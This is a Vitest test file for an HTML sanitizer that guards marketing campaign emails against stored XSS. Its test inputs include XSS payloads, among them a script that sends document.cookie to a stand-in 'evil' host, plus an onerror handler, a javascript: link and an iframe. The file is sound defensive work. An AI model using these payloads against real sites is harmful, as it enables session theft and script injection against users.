import { describe, it, expect } from 'vitest';
import { sanitizeCampaignHtml } from '../../netlify/functions/_shared/html-sanitize';

describe('sanitizeCampaignHtml — stored-XSS hardening for marketing body_html', () => {
  it('strips <script> tags entirely', () => {
    const out = sanitizeCampaignHtml('<p>Hi</p><script>document.location="//evil?c="+document.cookie</script>');
    expect(out).toContain('<p>Hi</p>');
    expect(out.toLowerCase()).not.toContain('<script');
    expect(out).not.toContain('document.cookie');
  });

  it('strips on* event handlers (img onerror, etc.)', () => {
    const out = sanitizeCampaignHtml('<img src="x" onerror="alert(1)">');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('alert(1)');
  });

  it('strips javascript: URLs on links', () => {
    const out = sanitizeCampaignHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toContain('javascript:');
    expect(out).toContain('click');
  });

  it('drops iframe/object/style tags', () => {
    const out = sanitizeCampaignHtml('<iframe src="//evil"></iframe><object data="x"></object><style>body{}</style>ok');
    expect(out.toLowerCase()).not.toContain('<iframe');
    expect(out.toLowerCase()).not.toContain('<object');
    expect(out.toLowerCase()).not.toContain('<style');
    expect(out).toContain('ok');
  });

  it('keeps legitimate email formatting (headings, bold, links, images, lists)', () => {
    const html = '<h1>Sale!</h1><p><strong>50% off</strong> — <a href="https://shop.example/deal">shop now</a></p><ul><li>Item</li></ul><img src="https://cdn.example/x.png" alt="banner">';
    const out = sanitizeCampaignHtml(html);
    expect(out).toContain('<h1>Sale!</h1>');
    expect(out).toContain('<strong>50% off</strong>');
    expect(out).toContain('href="https://shop.example/deal"');
    expect(out).toContain('<li>Item</li>');
    expect(out).toContain('src="https://cdn.example/x.png"');
  });
});
